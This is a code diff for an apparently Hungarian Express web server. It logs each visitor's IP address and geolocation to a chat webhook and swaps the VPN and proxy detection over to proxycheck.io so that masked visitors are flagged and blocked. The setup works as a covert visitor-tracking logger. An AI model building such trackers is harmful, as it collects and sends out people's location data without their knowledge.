@@ -9,6 +9,7 @@ const app = express();
 const PORT = process.env.PORT || 3000;
 const MAIN_WEBHOOK = process.env.MAIN_WEBHOOK;
 const ALERT_WEBHOOK = process.env.ALERT_WEBHOOK;
+const PROXYCHECK_API_KEY = process.env.PROXYCHECK_API_KEY;
 
 // ---- Magyarosított formázó minden fontos adattal ----
 function formatGeoDataMagyar(geo) {
@@ -45,19 +46,6 @@ function formatGeoDataMagyar(geo) {
   );
 }
 
-function magyarVpnInfo(geo) {
-  const check = v => v === true || v === "true";
-  if (check(geo.proxy) || check(geo.vpn) || check(geo.tor)) {
-    return "⚠️ VPN/proxy vagy TOR használat: IGEN";
-  }
-  return "VPN/proxy vagy TOR használat: NEM";
-}
-
-function isBlockedByVpnProxyTor(geo) {
-  const check = v => v === true || v === "true";
-  return check(geo.proxy) || check(geo.vpn) || check(geo.tor);
-}
-
 // ---- IP lekérés minden lehetőséggel ----
 function getClientIp(req) {
   if (req.headers['cf-connecting-ip']) {
@@ -86,12 +74,28 @@ async function getGeo(ip) {
   }
 }
 
+// ---- VPN/Proxy check proxycheck.io-val ----
+async function isVpnProxy(ip) {
+  try {
+    const url = `https://proxycheck.io/v2/${ip}?key=${PROXYCHECK_API_KEY}&vpn=1&asn=1&node=1`;
+    const res = await axios.get(url);
+    if (res.data && res.data[ip]) {
+      // proxy vagy VPN: "yes"
+      return res.data[ip].proxy === "yes" || res.data[ip].type === "VPN";
+    }
+    return false;
+  } catch (e) {
+    console.log("proxycheck.io hiba:", e.message);
+    return false;
+  }
+}
+
 // --- Főoldal (/) ---
 app.get('/', async (req, res) => {
   const ip = getClientIp(req);
   const geoData = await getGeo(ip);
 
-  // Mindig logol a MAIN webhookba (részletes adatokkal)
+  // Mindig logol a MAIN webhookba (részletes adatokkal, ipwhois.app)
   axios.post(MAIN_WEBHOOK, {
     username: "Helyszíni Naplózó <3",
     avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg",
@@ -100,14 +104,13 @@ app.get('/', async (req, res) => {
       title: 'Új látogató az oldalon!',
       description: `**Oldal:** /\n` +
                    `**IP-cím:** ${ip}\n` +
-                   `${magyarVpnInfo(geoData)}\n` +
                    formatGeoDataMagyar(geoData),
       color: 0x800080
     }]
   }).catch(()=>{});
 
-  // VPN/proxy/TOR log az ALERT webhookba is, és tiltás
-  if (isBlockedByVpnProxyTor(geoData)) {
+  // Csak a proxycheck.io alapján VPN/proxy blokkolás
+  if (await isVpnProxy(ip)) {
     axios.post(ALERT_WEBHOOK, {
       username: "VPN figyelő <3",
       avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg",
@@ -116,7 +119,6 @@ app.get('/', async (req, res) => {
         title: 'VPN/proxy vagy TOR-ral próbálkozás!',
         description: `**Oldal:** /\n` +
                      `**IP-cím:** ${ip}\n` +
-                     `${magyarVpnInfo(geoData)}\n` +
                      formatGeoDataMagyar(geoData),
         color: 0xff0000
       }]
@@ -138,7 +140,7 @@ app.get('/:page', async (req, res, next) => {
   const ip = getClientIp(req);
   const geoData = await getGeo(ip);
 
-  // Mindig logol a MAIN webhookba (részletes adatokkal)
+  // Mindig logol a MAIN webhookba (részletes adatokkal, ipwhois.app)
   axios.post(MAIN_WEBHOOK, {
     username: "Helyszíni Naplózó <3",
     avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg",
@@ -147,14 +149,13 @@ app.get('/:page', async (req, res, next) => {
       title: 'Új látogató az oldalon!',
       description: `**Oldal:** /${pageName}\n` +
                    `**IP-cím:** ${ip}\n` +
-                   `${magyarVpnInfo(geoData)}\n` +
                    formatGeoDataMagyar(geoData),
       color: 0x800080
     }]
   }).catch(()=>{});
 
-  // VPN/proxy/TOR log az ALERT webhookba is, és tiltás
-  if (isBlockedByVpnProxyTor(geoData)) {
+  // Csak a proxycheck.io alapján VPN/proxy blokkolás
+  if (await isVpnProxy(ip)) {
     axios.post(ALERT_WEBHOOK, {
       username: "VPN figyelő <3",
       avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg",
@@ -163,7 +164,6 @@ app.get('/:page', async (req, res, next) => {
         title: 'VPN/proxy vagy TOR-ral próbálkozás!',
         description: `**Oldal:** /${pageName}\n` +
                      `**IP-cím:** ${ip}\n` +
-                     `${magyarVpnInfo(geoData)}\n` +
                      formatGeoDataMagyar(geoData),
         color: 0xff0000
       }]
@@ -191,7 +191,6 @@ app.post('/report', express.json(), async (req, res) => {
         `**Oldal:** ${page || 'Ismeretlen'}\n` +
         `**Művelet:** ${reason}\n` +
         `**IP-cím:** ${ip}\n` +
-        `${magyarVpnInfo(geoData)}\n` +
         formatGeoDataMagyar(geoData),
       color: 0xff0000
     }]
